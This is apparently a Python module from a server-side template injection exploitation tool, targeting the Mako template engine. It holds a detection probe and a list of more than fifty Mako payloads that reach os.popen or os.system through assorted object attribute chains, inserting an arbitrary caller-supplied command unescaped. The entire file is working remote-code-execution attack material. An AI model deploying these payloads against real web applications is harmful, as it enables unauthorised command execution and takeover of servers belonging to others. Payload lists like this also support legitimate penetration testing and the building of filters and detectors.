class mako:
    def __init__(self):
        self.name = "mako"
        self.exec = True
        self.download = False

    def payload_test(self):
        return ['''<%
x=347*21
%>
${x}''']

    def execu(self,cmd,index=-1):
        payload = [
        '''<%
import os
x=os.popen("'''+cmd+'''").read()
%>
${x}
        ''',
        '${self.module.cache.util.os.system("'+cmd+'")}',
    '${self.module.runtime.util.os.system("'+cmd+'")}',
    '${self.template.module.cache.util.os.system("'+cmd+'")}',
    '${self.module.cache.compat.inspect.os.system("'+cmd+'")}',
    '${self.__init__.__globals__["util"].os.system("'+cmd+'")}',
    '${self.template.module.runtime.util.os.system("'+cmd+'")}',
    '${self.module.filters.compat.inspect.os.system("'+cmd+'")}',
    '${self.module.runtime.compat.inspect.os.system("'+cmd+'")}',
    '${self.module.runtime.exceptions.util.os.system("'+cmd+'")}',
    '${self.template.__init__.__globals__["os"].system("'+cmd+'")}',
    '${self.module.cache.util.compat.inspect.os.system("'+cmd+'")}',
    '${self.module.runtime.util.compat.inspect.os.system("'+cmd+'")}',
    '${self.template._mmarker.module.cache.util.os.system("'+cmd+'")}',
    '${self.template.module.cache.compat.inspect.os.system("'+cmd+'")}',
    '${self.module.cache.compat.inspect.linecache.os.system("'+cmd+'")}',
    '${self.template._mmarker.module.runtime.util.os.system("'+cmd+'")}',
    '${self.attr._NSAttr__parent.module.cache.util.os.system("'+cmd+'")}',
    '${self.template.module.filters.compat.inspect.os.system("'+cmd+'")}',
    '${self.template.module.runtime.compat.inspect.os.system("'+cmd+'")}',
    '${self.module.filters.compat.inspect.linecache.os.system("'+cmd+'")}',
    '${self.module.runtime.compat.inspect.linecache.os.system("'+cmd+'")}',
    '${self.template.module.runtime.exceptions.util.os.system("'+cmd+'")}',
    '${self.attr._NSAttr__parent.module.runtime.util.os.system("'+cmd+'")}',
    '${self.context._with_template.module.cache.util.os.system("'+cmd+'")}',
    '${self.module.runtime.exceptions.compat.inspect.os.system("'+cmd+'")}',
    '${self.template.module.cache.util.compat.inspect.os.system("'+cmd+'")}',
    '${self.context._with_template.module.runtime.util.os.system("'+cmd+'")}',
    '${self.module.cache.util.compat.inspect.linecache.os.system("'+cmd+'")}',
    '${self.template.module.runtime.util.compat.inspect.os.system("'+cmd+'")}',
    '${self.module.runtime.util.compat.inspect.linecache.os.system("'+cmd+'")}',
    '${self.module.runtime.exceptions.traceback.linecache.os.system("'+cmd+'")}',
    '${self.module.runtime.exceptions.util.compat.inspect.os.system("'+cmd+'")}',
    '${self.template._mmarker.module.cache.compat.inspect.os.system("'+cmd+'")}',
    '${self.template.module.cache.compat.inspect.linecache.os.system("'+cmd+'")}',
    '${self.attr._NSAttr__parent.template.module.cache.util.os.system("'+cmd+'")}',
    '${self.template._mmarker.module.filters.compat.inspect.os.system("'+cmd+'")}',
    '${self.template._mmarker.module.runtime.compat.inspect.os.system("'+cmd+'")}',
    '${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("'+cmd+'")}',
    '${self.template._mmarker.module.runtime.exceptions.util.os.system("'+cmd+'")}',
    '${self.template.module.filters.compat.inspect.linecache.os.system("'+cmd+'")}',
    '${self.template.module.runtime.compat.inspect.linecache.os.system("'+cmd+'")}',
    '${self.attr._NSAttr__parent.template.module.runtime.util.os.system("'+cmd+'")}',
    '${self.context._with_template._mmarker.module.cache.util.os.system("'+cmd+'")}',
    '${self.template.module.runtime.exceptions.compat.inspect.os.system("'+cmd+'")}',
    '${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("'+cmd+'")}',
    '${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("'+cmd+'")}',
    '${self.context._with_template.module.cache.compat.inspect.os.system("'+cmd+'")}',
    '${self.module.runtime.exceptions.compat.inspect.linecache.os.system("'+cmd+'")}',
    '${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("'+cmd+'")}',
    '${self.context._with_template._mmarker.module.runtime.util.os.system("'+cmd+'")}',
    '${self.context._with_template.module.filters.compat.inspect.os.system("'+cmd+'")}',
    '${self.context._with_template.module.runtime.compat.inspect.os.system("'+cmd+'")}',
    '${self.context._with_template.module.runtime.exceptions.util.os.system("'+cmd+'")}',
    '${self.template.module.runtime.exceptions.traceback.linecache.os.system("'+cmd+'")}'
        ]
        if index >= 0:
            return payload[index]
        return payload
